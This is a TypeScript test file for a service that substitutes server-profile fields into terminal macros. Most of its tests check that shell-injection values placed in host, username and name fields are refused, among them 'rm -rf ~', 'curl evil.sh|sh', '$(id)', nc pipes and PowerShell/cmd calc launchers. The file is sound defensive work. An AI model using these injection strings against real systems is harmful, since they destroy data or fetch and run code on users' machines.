import { describe, expect, it } from "vitest";
import {
  hasProfileTokens,
  profileTokenLabel,
  profileTokensUsed,
  resolveProfileTokens,
  unescapeProfileTokens,
  PROFILE_TOKEN_WHITELIST
} from "../../src/services/profileTokens";
import type { ProfileTokenContext } from "../../src/services/profileTokens";
import { scanPlaceholders, substituteMacroVariables } from "../../src/services/macroVariables";
import type { ServerConfig } from "../../src/models/config";

function server(overrides: Partial<ServerConfig> = {}): ServerConfig {
  return {
    id: "srv-1",
    name: "Core Switch",
    host: "10.1.2.3",
    port: 22,
    username: "admin",
    authType: "password",
    isHidden: false,
    ...overrides
  };
}

/** Every outcome the tests assert on is a success — narrows without `as`. */
function resolved(text: string, cfg: ServerConfig, context?: ProfileTokenContext): string {
  const outcome = resolveProfileTokens(text, cfg, context);
  if (!outcome.ok) {
    throw new Error(`expected a resolution, got ${outcome.error.kind} for ${outcome.error.token}`);
  }
  return outcome.text;
}

describe("resolveProfileTokens — substitution", () => {
  it("substitutes every whitelisted token", () => {
    const cfg = server({ ipmiHost: "bmc.example.com", port: 2222 });
    expect(
      resolved("${profile.name} ${profile.host}:${profile.port} ${profile.username} ${profile.ipmiHost}", cfg)
    ).toBe("Core Switch 10.1.2.3:2222 admin bmc.example.com");
  });

  it("leaves text with no tokens untouched", () => {
    expect(resolved("show version\n", server())).toBe("show version\n");
  });

  it("refuses a value that would be a replacement pattern, in every token", () => {
    // Two hazards, one rule. `String.replace(re, value)` expands `$&` / `$'`
    // inside the VALUE (array-append already cannot), and `runMacroOnServer`
    // hands the resolved text to the VARIABLE engine, which scans it again — so
    // a substituted `$password` would splice a prompted secret into the command.
    // Both are closed by refusing `$` and a backtick in every token, which is
    // the invariant the second pass depends on.
    for (const token of PROFILE_TOKEN_WHITELIST) {
      if (token === "port") continue;
      for (const bad of ["$& $` $'", "$password", "a$1b", "x`id`y"]) {
        const outcome = resolveProfileTokens(
          `echo \${profile.${token}}`,
          server({ [token]: bad } as Partial<ServerConfig>)
        );
        expect(outcome.ok, `expected refusal for ${token} = ${bad}`).toBe(false);
      }
    }
  });

  it("leaves a prompted variable in the macro text for the second pass, and nowhere else", () => {
    // The pipeline: profile tokens first, then the variable engine over the
    // SAME string. `$password` written by the macro author must survive this
    // pass untouched — it is a placeholder, not a profile value.
    const cfg = server({ ipmiHost: "10.0.0.9" });
    expect(resolved("ipmitool -H \${profile.ipmiHost} -P $password", cfg)).toBe(
      "ipmitool -H 10.0.0.9 -P $password"
    );
  });

  it("substitutes every occurrence of the same token", () => {
    const cfg = server({ ipmiHost: "10.9.9.9" });
    expect(resolved("ping ${profile.ipmiHost}; ssh ${profile.ipmiHost}", cfg)).toBe("ping 10.9.9.9; ssh 10.9.9.9");
  });
});

describe("resolveProfileTokens — escaping", () => {
  it("$${profile.host} produces the literal token, not the value", () => {
    expect(resolved("echo $${profile.host}", server())).toBe("echo ${profile.host}");
  });

  it("an escaped token does not require the field to be set", () => {
    // The docs-style macro `echo $${profile.ipmiHost}` must stay runnable on a
    // server with no BMC — only UNESCAPED uses constrain the run.
    expect(resolved("echo $${profile.ipmiHost}", server())).toBe("echo ${profile.ipmiHost}");
  });

  it("escaped and unescaped uses of the same token coexist", () => {
    const cfg = server({ ipmiHost: "10.9.9.9" });
    expect(resolved("$${profile.ipmiHost} = ${profile.ipmiHost}", cfg)).toBe("${profile.ipmiHost} = 10.9.9.9");
  });
});

describe("resolveProfileTokens — unknown tokens", () => {
  it("passes an unknown token through verbatim and reports it", () => {
    const outcome = resolveProfileTokens("ssh ${profile.keyPath} ${profile.host}", server());
    expect(outcome.ok).toBe(true);
    if (!outcome.ok) return;
    expect(outcome.text).toBe("ssh ${profile.keyPath} 10.1.2.3");
    expect(outcome.unknownTokens).toEqual(["keyPath"]);
  });

  it("reports each unknown token once, in first-appearance order", () => {
    const outcome = resolveProfileTokens("${profile.b} ${profile.a} ${profile.b}", server());
    expect(outcome.ok).toBe(true);
    if (!outcome.ok) return;
    expect(outcome.unknownTokens).toEqual(["b", "a"]);
  });

  it("never exposes a non-whitelisted ServerConfig field", () => {
    const cfg = server({ keyPath: "/home/user/.ssh/id_ed25519", authProfileId: "profile-7" });
    expect(resolved("${profile.keyPath} ${profile.authProfileId} ${profile.id}", cfg)).toBe(
      "${profile.keyPath} ${profile.authProfileId} ${profile.id}"
    );
  });
});

describe("resolveProfileTokens — missing fields", () => {
  it("sends the user to the Advanced section for the field that lives there", () => {
    // "Edit Server" opens a form whose IPMI / BMC Host is collapsed, so an error
    // that only names the field is a dead end.
    const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server());
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.message).toContain("Add it under Advanced options in the server form.");
  });

  it("refuses the run when ipmiHost is not set, naming server and field", () => {
    const outcome = resolveProfileTokens(" ipmitool -H ${profile.ipmiHost} sol activate\n", server());
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("missing");
    expect(outcome.error.token).toBe("ipmiHost");
    expect(outcome.error.serverName).toBe("Core Switch");
    expect(outcome.error.message).toContain("Core Switch");
    expect(outcome.error.message).toContain(profileTokenLabel("ipmiHost"));
    // The two implementations this rules out, both of which would "work":
    // sending the literal token, and sending an empty `-H` argument.
    expect(JSON.stringify(outcome)).not.toContain("ipmitool -H ${profile.ipmiHost}");
    expect(JSON.stringify(outcome)).not.toContain("ipmitool -H  sol");
  });

  it("treats an empty or whitespace-only field as not set", () => {
    expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "" })).ok).toBe(false);
    expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "   " })).ok).toBe(false);
  });

  it("trims a padded value rather than substituting the padding", () => {
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "  10.0.0.1  " }))).toBe("-H 10.0.0.1");
  });

  it("treats a non-numeric port as not set instead of substituting \"undefined\"", () => {
    const outcome = resolveProfileTokens("-p ${profile.port}", server({ port: undefined as unknown as number }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("port");
  });
});

describe("resolveProfileTokens — injection defense", () => {
  it("refuses a host carrying shell syntax", () => {
    // Reachable through inventory sync and backup import, and the resolved text
    // of a localTerminal macro is executed on the user's own machine.
    const outcome = resolveProfileTokens("ping ${profile.host}", server({ host: "1.2.3.4; rm -rf ~" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("host");
    // The refusal names the offending value (that is the point of the message),
    // but it must never produce the RESOLVED command line.
    expect(JSON.stringify(outcome)).not.toContain("ping 1.2.3.4");
    expect(outcome.error.message).toContain("1.2.3.4; rm -rf ~");
  });

  it("refuses command substitution and pipes in an ipmiHost", () => {
    for (const bad of ["`curl evil|sh`", "$(id)", "10.0.0.1 && reboot", "10.0.0.1|nc x 1", "a>b"]) {
      const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: bad }));
      expect(outcome.ok, `expected refusal for ${bad}`).toBe(false);
    }
  });

  it("accepts ordinary addresses: IPv4, bracketed IPv6, and FQDNs", () => {
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[::1]" }))).toBe("-H [::1]");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[fe80::1]" }))).toBe("-H [fe80::1]");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[::ffff:10.0.0.1]" }))).toBe("-H [::ffff:10.0.0.1]");
    // The port suffix is legitimate for THIS field: `ipmiHost` reaches a URL
    // through the shipped `https://${profile.ipmiHost}/` browser macro, and the
    // unbracketed equivalent (`bmc.example.com:8443`) has always been accepted
    // by the same charset — refusing only the bracketed form would be arbitrary.
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[fe80::1]:623" }))).toBe("-H [fe80::1]:623");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "bmc.example.com:8443" }))).toBe(
      "-H bmc.example.com:8443"
    );
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "fe80::1" }))).toBe("-H fe80::1");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "bmc-01.dc1.example.com" }))).toBe("-H bmc-01.dc1.example.com");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "10.0.0.1" }))).toBe("-H 10.0.0.1");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "bmc_01" }))).toBe("-H bmc_01");
  });

  it("requires port to be digits only", () => {
    expect(resolveProfileTokens("-p ${profile.port}", server({ port: "22; id" as unknown as number })).ok).toBe(false);
    expect(resolved("-p ${profile.port}", server({ port: 2222 }))).toBe("-p 2222");
  });

  it("refuses a newline in ANY token — a terminal send executes what follows it", () => {
    for (const token of PROFILE_TOKEN_WHITELIST) {
      if (token === "port") continue;
      const outcome = resolveProfileTokens(`x \${profile.${token}}`, server({ [token]: "ok\nreboot" } as Partial<ServerConfig>));
      expect(outcome.ok, `expected refusal for ${token}`).toBe(false);
    }
  });

  it("still allows a free-form display name — it is a label, not an address", () => {
    expect(resolved("# ${profile.name}", server({ name: "Core Switch DC1" }))).toBe("# Core Switch DC1");
    // Spaces, accents, slashes and dots stay legal: `name` is a blacklist, not a
    // charset, and refusing these would break ordinary profile names. With glob
    // syntax refused (see below) they are inert text — a "/" expands into
    // nothing. Square brackets USED to be in this list and no longer are.
    expect(resolved("# ${profile.name}", server({ name: "Rack 4 / Ünit 2" }))).toBe("# Rack 4 / Ünit 2");
    expect(resolved("# ${profile.name}", server({ name: "Rack A - Spare" }))).toBe("# Rack A - Spare");
    expect(resolved("# ${profile.name}", server({ name: "Ærø-Süd Ünit 2" }))).toBe("# Ærø-Süd Ünit 2");
  });

  it("refuses parentheses in a display name, which USED TO BE ACCEPTED as \"Core Switch (DC1)\"", () => {
    // DELIBERATE FLIP of the old "parentheses are fine" assertion. The local
    // shell a `localTerminal` macro lands in is the platform default, which on
    // Windows is PowerShell, and PowerShell evaluates a parenthesised
    // subexpression in ARGUMENT position: the resolved line below started calc
    // before Write-Output was handed anything. A server name reaches the config
    // from a backup import and from inventory sync, so this is attacker-supplied
    // input that needed no character the old blacklist refused.
    const outcome = resolveProfileTokens("Write-Output ${profile.name}\n", server({ name: "(Start-Process calc)" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("name");
    // The exact executable line the pre-fix implementation produced.
    expect(JSON.stringify(outcome)).not.toContain("Write-Output (Start-Process calc)");
    // And the message names what to remove, or it is a dead end.
    expect(outcome.error.message).toContain("parentheses");
    // The ordinary label, minus the parens, still runs.
    expect(resolved("Write-Output ${profile.name}\n", server({ name: "Core Switch DC1" }))).toBe(
      "Write-Output Core Switch DC1\n"
    );
  });

  it("refuses braces in a display name — `.{…}` invokes a scriptblock out of characters otherwise legal", () => {
    // `&` is already refused, but `.` cannot be (every site-code label has dots),
    // so a scriptblock literal is one permitted character away from running.
    const outcome = resolveProfileTokens("${profile.name}\n", server({ name: ".{Start-Process calc}" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("name");
    expect(JSON.stringify(outcome)).not.toContain(".{Start-Process calc}\\n");
    expect(outcome.error.message).toContain("braces");
  });

  it("refuses `%` in a display name — cmd.exe expands `%VAR%` at command position", () => {
    // DELIBERATE FLIP of "% is just a character". The third default shell:
    // `terminal.integrated.defaultProfile.windows` can be Command Prompt, and
    // cmd expands `%COMSPEC%` while PARSING, before anything runs — so the
    // resolved line below launches calc via cmd.exe, using no character the old
    // blacklist refused. A name arrives from inventory sync and backup import.
    const outcome = resolveProfileTokens("${profile.name}\n", server({ name: "%COMSPEC% /c calc" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("name");
    // The exact executable line the pre-fix implementation produced.
    expect(JSON.stringify(outcome)).not.toContain("%COMSPEC% /c calc\\n");
    // The message names what to remove, or it is a dead end.
    expect(outcome.error.message).toContain("%");
    // An ordinary label is unaffected — this is not a new charset for `name`.
    expect(resolved("# ${profile.name}", server({ name: "Rack 4 / Ünit 2" }))).toBe("# Rack 4 / Ünit 2");
  });

  it("refuses `!` — interactive bash expands `!!` into a previous command line, punctuation included", () => {
    // Delayed expansion is off by default in cmd, so cmd is not the reason;
    // bash is. History expansion is on in every interactive shell, and a macro
    // send lands in one.
    const outcome = resolveProfileTokens("echo ${profile.name}\n", server({ name: "DC1!!" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("name");
    expect(JSON.stringify(outcome)).not.toContain("echo DC1!!");
    expect(outcome.error.message).toContain("!");
  });

  it("keeps `^` legal — cmd's escape character can only REMOVE meaning, never add it", () => {
    // The other half of the cmd.exe decision, asserted so a later "refuse
    // everything cmd looks at" sweep has to argue with it: `^` cannot turn
    // plain text into syntax, and `^^` is a literal caret. In bash and
    // PowerShell it is an ordinary character.
    expect(resolved("# ${profile.name}", server({ name: "Rack 4 ^ Spare" }))).toBe("# Rack 4 ^ Spare");
  });

  it("refuses `%` and `!` one at a time, in `name` only — the address charsets already excluded them", () => {
    for (const bad of ["a%b", "100%", "a!b", "Do not touch!"]) {
      expect(resolveProfileTokens("x ${profile.name}", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
    // `host`/`ipmiHost`/`username` are positive charsets and never admitted
    // either character — asserted so the two rules cannot silently diverge.
    for (const bad of ["10.0.0.1%2", "10.0.0.1!"]) {
      expect(resolveProfileTokens("-H ${profile.host}", server({ host: bad })).ok, `host ${bad}`).toBe(false);
      expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: bad })).ok, `ipmiHost ${bad}`).toBe(false);
    }
    for (const bad of ["ad%min", "admin!"]) {
      expect(resolveProfileTokens("-U ${profile.username}", server({ username: bad })).ok, `username ${bad}`).toBe(false);
    }
    expect(resolveProfileTokens("-p ${profile.port}", server({ port: "22%" as unknown as number })).ok).toBe(false);
  });

  it("refuses parens and braces one at a time, and only in `name` — the address charsets are untouched", () => {
    for (const bad of ["a(b", "a)b", "a{b", "a}b", "(id)", "Core Switch (DC1)"]) {
      expect(resolveProfileTokens("x ${profile.name}", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
    // `host`/`ipmiHost` never accepted these anyway (they are charsets, not
    // blacklists) and MUST keep accepting bracketed IPv6.
    expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "(id)" })).ok).toBe(false);
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[fe80::1]" }))).toBe("-H [fe80::1]");
  });

  it("refuses glob syntax in a display name, which USED TO ACCEPT `[abc]` and `*`", () => {
    // DELIBERATE FLIP of the old "square brackets are fine" assertion. The old
    // rationale only asked whether `[Type]::Member` could reach a PowerShell
    // METHOD (it cannot without `(` or `{`, both refused). It never asked what a
    // default bash does with the same characters: pathname expansion replaces
    // the word with matching FILENAMES before the command runs.
    const outcome = resolveProfileTokens("${profile.name}\n", server({ name: "./scripts/*" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("name");
    // The exact line the pre-fix implementation produced — a glob at command
    // position, which the shell resolves to a file it then executes.
    expect(JSON.stringify(outcome)).not.toContain("./scripts/*\\n");
    expect(outcome.error.message).toContain("*");

    // Each glob metacharacter alone, including the bracket expression that the
    // previous version of this file explicitly permitted as "Rack A [Spare]".
    for (const bad of ["x?", "[abc]", "Rack A [Spare]", "*", "a*b", "log[0-9]", "]", "["]) {
      expect(resolveProfileTokens("cmd ${profile.name}\n", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
  });

  it("refuses `~` in a display name — one character, one home-directory path, in a default shell", () => {
    const outcome = resolveProfileTokens("ls ${profile.name}\n", server({ name: "~backup" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("name");
    expect(JSON.stringify(outcome)).not.toContain("ls ~backup\\n");
    expect(outcome.error.message).toContain("~");
    for (const bad of ["~", "DC1 ~", "~/dc1"]) {
      expect(resolveProfileTokens("ls ${profile.name}\n", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
  });

  it("keeps a path-shaped name legal once globs are gone — literal text is not expansion", () => {
    // The line the charset is NOT trying to draw: `/`, `.` and spaces cannot
    // expand into anything, so they stay legal even though a name of `/bin/sh`
    // at command position would run. That is the macro's template putting a
    // display name where a command goes, not this charset turning data into
    // syntax — and refusing `/` or `.` would break every site-code label.
    expect(resolved("# ${profile.name}", server({ name: "Rack 4 / Unit 2" }))).toBe("# Rack 4 / Unit 2");
    expect(resolved("# ${profile.name}", server({ name: "dc1.rack4.unit2" }))).toBe("# dc1.rack4.unit2");
  });

  it("refuses brackets in host/ipmiHost unless the WHOLE value is a bracketed IPv6 literal", () => {
    // DELIBERATE FLIP: `[` and `]` used to be plain members of the address
    // charset, accepted anywhere in the value. `[abc]` is then a POSIX bracket
    // expression — unquoted in a localTerminal macro the shell replaces it with
    // a file named `a`, `b` or `c` from the working directory, which at command
    // position is what runs.
    const outcome = resolveProfileTokens("${profile.ipmiHost}\n", server({ ipmiHost: "[abc]" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("ipmiHost");
    expect(JSON.stringify(outcome)).not.toContain("[abc]\\n");

    for (const bad of ["a[b]c", "[abc]", "10.0.0.[1-9]", "[]", "[fe80::1", "fe80::1]", "[[::1]]", "[::1]:99999999"]) {
      expect(resolveProfileTokens("-H ${profile.host}", server({ host: bad })).ok, `host ${bad}`).toBe(false);
      expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: bad })).ok, `ipmiHost ${bad}`).toBe(
        false
      );
    }
    // The bracketed form the field exists to carry is untouched.
    expect(resolved("-H ${profile.host}", server({ host: "[::1]" }))).toBe("-H [::1]");
    expect(resolved("-H ${profile.host}", server({ host: "[fe80::1]:623" }))).toBe("-H [fe80::1]:623");
    // …and so are the unbracketed addresses, which never went near this rule.
    expect(resolved("-H ${profile.host}", server({ host: "10.0.0.1" }))).toBe("-H 10.0.0.1");
    expect(resolved("-H ${profile.host}", server({ host: "bmc.example.com" }))).toBe("-H bmc.example.com");
  });

  it("pins that the address charset admits no glob or tilde character, bracket rule aside", () => {
    // Assertion-style: `*`, `?` and `~` were never IN the positive charset, and
    // this test exists so a later "let hostnames be more permissive" edit has to
    // delete it on purpose rather than widen the class by accident.
    for (const bad of ["10.0.0.*", "host?", "~/host", "a~b", "10.0.0.1 *", "*"]) {
      expect(resolveProfileTokens("-H ${profile.host}", server({ host: bad })).ok, `host ${bad}`).toBe(false);
      expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: bad })).ok, `ipmiHost ${bad}`).toBe(
        false
      );
    }
  });

  it("refuses a username carrying shell syntax — it reaches a local command line too", () => {
    // The reachable path: inventory sync writes `after.username` straight from
    // the endpoint, and the shipped IPMI template puts it in `-U` on a LOCAL
    // terminal. Without a charset here the resolved line is executable.
    const outcome = resolveProfileTokens(
      " ipmitool -U ${profile.username} sol activate\n",
      server({ username: "root; curl evil.sh|sh;" })
    );
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("username");
    // The exact line a permissive `username` produced before this check existed.
    expect(JSON.stringify(outcome)).not.toContain("ipmitool -U root; curl evil.sh|sh; sol activate");
  });

  it("refuses shell syntax in a display name, which is otherwise free-form", () => {
    const outcome = resolveProfileTokens(
      " echo ${profile.name} >> /tmp/log\n",
      server({ name: "Core; rm -rf ~" })
    );
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("name");
    expect(JSON.stringify(outcome)).not.toContain("echo Core; rm -rf ~ >>");
  });

  it("refuses every metacharacter in username and name, one at a time", () => {
    for (const bad of ["a;b", "a|b", "a&b", "a<b", "a>b", "a`b`", "a$b", "a'b", 'a"b', "a\\b"]) {
      expect(resolveProfileTokens("x ${profile.username}", server({ username: bad })).ok, `username ${bad}`).toBe(false);
      expect(resolveProfileTokens("x ${profile.name}", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
  });

  it("accepts the usernames people actually have, including the email-style form", () => {
    for (const good of ["admin", "svc_nexus", "first.last", "ADMIN-2", "user@REALM.EXAMPLE.COM"]) {
      expect(resolved("-U ${profile.username}", server({ username: good }))).toBe(`-U ${good}`);
    }
    // A space is not part of any real username, and it is what separates one
    // argument from the next.
    expect(resolveProfileTokens("-U ${profile.username}", server({ username: "two words" })).ok).toBe(false);
  });

  it("names the offending value and what the field accepts, so the message is not a dead end", () => {
    const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "https://10.0.0.1/" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.message).toContain('"https://10.0.0.1/"');
    expect(outcome.error.message).toContain("Use the address only");
    expect(outcome.error.message).toContain("https://");
    expect(outcome.error.message).toContain("Nothing was sent.");
  });

  it("truncates a very long offending value instead of pasting it whole into a notification", () => {
    const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: `${"a".repeat(300)};id` }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.message).toContain("…");
    expect(outcome.error.message.length).toBeLessThan(400);
  });
});

/**
 * REVIEW FINDING (P2) — a bare IPv6 host is legal in an address field, correct
 * on a command line (`-H fe80::1`), and NOT a URL: `https://fe80::1/` fails
 * `new URL()`, so the shipped browser macro opened nothing and blamed the macro
 * text. The value's form is what depends on the destination, so the destination
 * is passed in.
 */
describe("resolveProfileTokens — URL form brackets a bare IPv6 address", () => {
  const URL_FORM: ProfileTokenContext = { form: "url" };

  it("brackets a bare IPv6 literal so the result parses as a URL", () => {
    const text = resolved("https://${profile.ipmiHost}/", server({ ipmiHost: "fe80::1" }), URL_FORM);
    expect(text).toBe("https://[fe80::1]/");
    // The property that actually matters — the pre-fix `https://fe80::1/` throws.
    expect(new URL(text).protocol).toBe("https:");
  });

  it("does the same for ${profile.host}, and for every IPv6 shape the field accepts", () => {
    for (const [stored, expected] of [
      ["::1", "[::1]"],
      ["fe80::1", "[fe80::1]"],
      ["2001:db8:0:0:0:0:0:1", "[2001:db8:0:0:0:0:0:1]"],
      ["2001:0db8:85a3:0000:0000:8a2e:0370:7334", "[2001:0db8:85a3:0000:0000:8a2e:0370:7334]"],
      ["::ffff:10.0.0.1", "[::ffff:10.0.0.1]"]
    ] as const) {
      expect(resolved("https://${profile.host}/", server({ host: stored }), URL_FORM)).toBe(`https://${expected}/`);
    }
  });

  it("never double-brackets a value that is already bracketed, with or without a port", () => {
    expect(resolved("https://${profile.ipmiHost}/", server({ ipmiHost: "[fe80::1]" }), URL_FORM)).toBe(
      "https://[fe80::1]/"
    );
    // `[fe80::1]:623` is already a valid URL authority — bracketing it again
    // would produce `[[fe80::1]:623]`, which is not.
    expect(resolved("https://${profile.ipmiHost}/", server({ ipmiHost: "[fe80::1]:623" }), URL_FORM)).toBe(
      "https://[fe80::1]:623/"
    );
    expect(new URL(resolved("https://${profile.ipmiHost}/", server({ ipmiHost: "[fe80::1]:623" }), URL_FORM)).port).toBe(
      "623"
    );
  });

  it("does NOT bracket a host:port that merely contains a colon", () => {
    // The trap a "contains a colon" test would fall into: this value works in a
    // URL today, and `[bmc.example.com:8443]` would break it.
    expect(resolved("https://${profile.ipmiHost}/", server({ ipmiHost: "bmc.example.com:8443" }), URL_FORM)).toBe(
      "https://bmc.example.com:8443/"
    );
    expect(resolved("https://${profile.host}/", server({ host: "10.0.0.9:8443" }), URL_FORM)).toBe(
      "https://10.0.0.9:8443/"
    );
  });

  it("leaves every non-IPv6 address untouched", () => {
    for (const stored of ["10.0.0.9", "bmc.example.com", "bmc-1_dc4", "192.168.1.1"]) {
      expect(resolved("https://${profile.host}/", server({ host: stored }), URL_FORM)).toBe(`https://${stored}/`);
    }
  });

  it("brackets NOTHING but the two address tokens", () => {
    // `name`, `port` and `username` have no URL-authority form to fix, and a
    // form-blind "bracket anything that looks like IPv6" would reach them.
    expect(resolved("https://x/?u=${profile.username}&n=${profile.name}", server({ username: "a.b", name: "Core Switch" }), URL_FORM)).toBe(
      "https://x/?u=a.b&n=Core Switch"
    );
    expect(resolved("https://x:${profile.port}/", server({ port: 8443 }), URL_FORM)).toBe("https://x:8443/");
  });

  it("COMMAND FORM IS UNCHANGED — `-H fe80::1` is what ipmitool wants", () => {
    // The other half of the fix, and the one a context-blind always-bracket
    // implementation breaks: the shipped SOL template is a localTerminal macro.
    expect(resolved(" ipmitool -H ${profile.ipmiHost} sol activate\n", server({ ipmiHost: "fe80::1" }))).toBe(
      " ipmitool -H fe80::1 sol activate\n"
    );
    expect(resolved("-H ${profile.host}", server({ host: "fe80::1" }), { form: "command" })).toBe("-H fe80::1");
    // Explicit default: omitting the context is command form.
    expect(resolved("-H ${profile.host}", server({ host: "::1" }))).toBe("-H ::1");
  });

  it("does not change what is ACCEPTED — the charset is the same in both forms", () => {
    // Bracketing is a rendering decision, never a permission one: a value that
    // carries shell syntax is refused for a URL too (the same text is one
    // `runIn` change away from a command line).
    for (const bad of ["1.2.3.4; rm -rf ~", "[abc]", "a[b]c", "https://10.0.0.1/"]) {
      expect(resolveProfileTokens("https://${profile.ipmiHost}/", server({ ipmiHost: bad }), URL_FORM).ok, bad).toBe(
        false
      );
    }
    // …and a missing field still refuses rather than substituting empty brackets.
    expect(resolveProfileTokens("https://${profile.ipmiHost}/", server(), URL_FORM).ok).toBe(false);
  });

  it("leaves an ESCAPED token literal in URL form too", () => {
    expect(resolved("https://$${profile.ipmiHost}/", server({ ipmiHost: "fe80::1" }), URL_FORM)).toBe(
      "https://${profile.ipmiHost}/"
    );
  });
});

describe("profile tokens vs. declared macro variables", () => {
  it("a declared `host` is still prompted while ${profile.host} resolves from the profile", () => {
    // The precedence guard: the shipped grammar cannot produce a dotted name, so
    // the two placeholders are different tokens and neither shadows the other.
    // An implementation that auto-filled bare `$host` from the profile would
    // stop prompting — and silently change what every existing macro sends.
    const text = "connect $host via ${profile.host}";
    const afterTokens = resolved(text, server());
    expect(afterTokens).toBe("connect $host via 10.1.2.3");

    const scan = scanPlaceholders(afterTokens, ["host"]);
    expect(scan.used).toEqual(["host"]);

    expect(substituteMacroVariables(afterTokens, { host: "typed-by-user" }, ["host"])).toBe(
      "connect typed-by-user via 10.1.2.3"
    );
  });

  it("leaves the existing bare-name grammar alone — $profile.host is not a profile token", () => {
    expect(resolved("$profile.host", server())).toBe("$profile.host");
  });
});

describe("unescapeProfileTokens — the server-independent half of the escape rule", () => {
  it("rewrites $${profile.host} to the literal token", () => {
    // REVIEW FINDING (P2) — the behavior `$${profile.…}` is documented to have,
    // on every send path rather than only inside `resolveProfileTokens()`.
    expect(unescapeProfileTokens("echo $${profile.host}")).toBe("echo ${profile.host}");
  });

  it("leaves an UNESCAPED token completely alone — it has no server to resolve against", () => {
    // The property that makes this safe to run on paths that know no server:
    // it never substitutes, so a real token still reaches
    // `resolveProfileTokens()` (or is refused/redirected) unchanged.
    expect(unescapeProfileTokens("ping ${profile.host}")).toBe("ping ${profile.host}");
    expect(unescapeProfileTokens("$${profile.host} = ${profile.host}")).toBe("${profile.host} = ${profile.host}");
  });

  it("leaves an escaped UNKNOWN token verbatim, exactly as resolveProfileTokens does", () => {
    // Shared walker, shared rule: an unknown token is verbatim escaped or not,
    // so the two functions cannot disagree about `$${profile.keyPath}`.
    expect(unescapeProfileTokens("echo $${profile.keyPath}")).toBe("echo $${profile.keyPath}");
    expect(resolved("echo $${profile.keyPath}", server())).toBe("echo $${profile.keyPath}");
  });

  it("agrees with resolveProfileTokens on every escaped form, character for character", () => {
    // The single-source-of-truth claim, asserted rather than asserted-in-a-comment:
    // for text whose ONLY tokens are escaped, the server path and the
    // server-independent path must produce the identical string. `$$$` included —
    // an odd run of dollars leaves one behind, and both must leave the same one.
    for (const text of [
      "echo $${profile.host}",
      "echo $${profile.ipmiHost}\n",
      "$${profile.name} $${profile.port} $${profile.username}",
      "$$${profile.host}",
      "echo $${profile.keyPath}",
      "no tokens here\n"
    ]) {
      expect(unescapeProfileTokens(text), text).toBe(resolved(text, server()));
    }
  });

  it("leaves text with no profile tokens byte-identical, macro variables included", () => {
    // The variable grammar has no dots, so nothing here can be mistaken for a
    // profile token — `$host` / `${host}` / `$$host` must survive untouched for
    // the variable engine that runs after this pass.
    for (const text of ["show version\n", "$host ${host} $$host", "$profile.host", "100% $ok"]) {
      expect(unescapeProfileTokens(text), text).toBe(text);
    }
  });
});

describe("profileTokensUsed / hasProfileTokens", () => {
  it("lists the whitelisted tokens a macro actually uses, unescaped, once each", () => {
    expect(profileTokensUsed("${profile.host} ${profile.host} ${profile.ipmiHost}")).toEqual(["host", "ipmiHost"]);
  });

  it("ignores escaped and unknown tokens", () => {
    expect(profileTokensUsed("$${profile.host} ${profile.nope}")).toEqual([]);
    expect(hasProfileTokens("$${profile.host}")).toBe(false);
    expect(hasProfileTokens("${profile.ipmiHost}")).toBe(true);
    expect(hasProfileTokens("show version\n")).toBe(false);
  });
});
